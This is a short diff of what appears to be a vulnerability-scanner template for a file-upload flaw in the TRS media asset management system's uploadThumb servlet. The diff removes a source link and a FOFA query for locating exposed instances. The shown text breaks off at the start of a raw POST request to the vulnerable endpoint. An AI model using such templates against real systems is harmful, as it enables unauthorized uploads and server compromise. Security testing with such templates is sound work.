@@ -3,12 +3,8 @@ info:
   name: 拓尔思TRS媒资管理系统uploadThumb存在文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hms6cvl0p53vxr25'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hms6cvl0p53vxr25
-    fofa: '"TRS媒资管理系统"'
 http:
 - raw:
   - 'POST /mas/servlets/uploadThumb?appKey=sv&uploadingId=asd HTTP/1.1
